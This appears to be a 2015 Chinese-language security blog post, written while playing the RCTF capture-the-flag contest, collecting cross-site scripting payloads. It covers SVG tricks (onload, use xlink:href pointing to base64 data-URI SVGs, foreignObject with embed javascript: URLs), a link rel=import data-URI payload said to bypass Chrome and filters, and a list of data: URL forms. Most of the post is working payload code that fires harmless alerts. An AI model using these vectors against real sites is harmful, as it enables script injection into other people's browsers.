title: xss link&svg黑魔法
date: 2015-11-19 23:49:07
tags:
- Blogs
- xss
categories:
- Blogs
---
在搞rctf的时候，无意间搜到了一些黑魔法，link and svg标签的奇效...

<!--more-->

# svg
对于svg，之前一直知道的仅仅只有svg可以不用交互，这样js伪协议和类似于
```<svg/onload=alert(1)>```这样的标签就可以执行，这次发现一个神奇的东西，虽然只能在firefox下执行，但是仍然是可用的。
```
<svg>
<use xlink:href='external.svg#rectangle' />
</svg>
```
如果存在external.svg，而且其中存在这样的代码
```
<svg id="rectangle" xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink"
width="100" height="100">
<a xlink:href="javascript:alert(location)">
<rect x="0" y="0" width="100" height="100" />
</a>
</svg>
```
这样就会出现100*100的黑块，点击就会弹窗，但是事实上并没有这么简单，上面的payload其实改成这样：
```
<svg>
<use xlink:href="data:image/svg+xml;base64,
PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDo
vL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW
5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rI
iAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+DQo8
YSB4bGluazpocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KGx
vY2F0aW9uKSI+PHJlY3QgeD0iMCIgeT0iMCIgd2lkdG
g9IjEwMCIgaGVpZ2h0PSIxMDAiIC8+PC9hPg0KPC9zd
mc+#rectangle" />
</svg>
```
这样就不用存在别的svg文件，就可以执行所需要的js代码完成xss。
但是这样仍然需要点击才能出发xss。
然而在svg中支持

```
<foreignObject>
```

这样的标签,包括
```
<embed>
```
所以上面的payload就可以改成

```
<svg id="rectangle"
xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink"
width="100" height="100">

<script>alert(1)</script>

<foreignObject width="100" height="50"
requiredExtensions="http://www.w3.org/1999/xhtml">

<embed xmlns="http://www.w3.org/1999/xhtml" 
src="javascript:alert(location)" />

</foreignObject>
</svg>
```
base64一下就是
```
<svg>
<use xlink:href="data:image/svg+xml;base64,
PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cD
ovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhs
aW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW
5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3
JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0i
NTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZW
RFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8x
OTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dH
A6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0i
amF2YXNjcmlwdDphbGVydChsb2NhdGlvbikiIC8+DQ
ogICAgPC9mb3JlaWduT2JqZWN0Pg0KPC9zdmc+#rectangle" />
</svg>
```

# link
在这次比赛的writeup中见到的是这样的link标签，比上面的方式好用很多，因为可以bypass最新版chrome。
payload大概是长这样的
```
<link rel="import" href="data:text/html;base64,PHNjcmlwdD5kZWxldGUgYWxlcnQ7YWxlcnQoIkhlbGxvIik7PC9zY3JpcHQ+">
```
href的地方本身就是可以插入js代码的，但是通过base64加密，可以bypass各种奇怪的过滤

这里很多用到了data类型的url，然而还有各种姿势
```
data:,<文本数据>  
data:text/plain,<文本数据>  
data:text/html,<HTML代码>  
data:text/html;base64,<base64编码的HTML代码>  
data:text/css,<CSS代码>  
data:text/css;base64,<base64编码的CSS代码>  
data:text/javascript,<Javascript代码>  
data:text/javascript;base64,<base64编码的Javascript代码>  
data:image/gif;base64,base64编码的gif图片数据  
data:image/png;base64,base64编码的png图片数据  
data:image/jpeg;base64,base64编码的jpeg图片数据  
data:image/x-icon;base64,base64编码的icon图片数据  
```

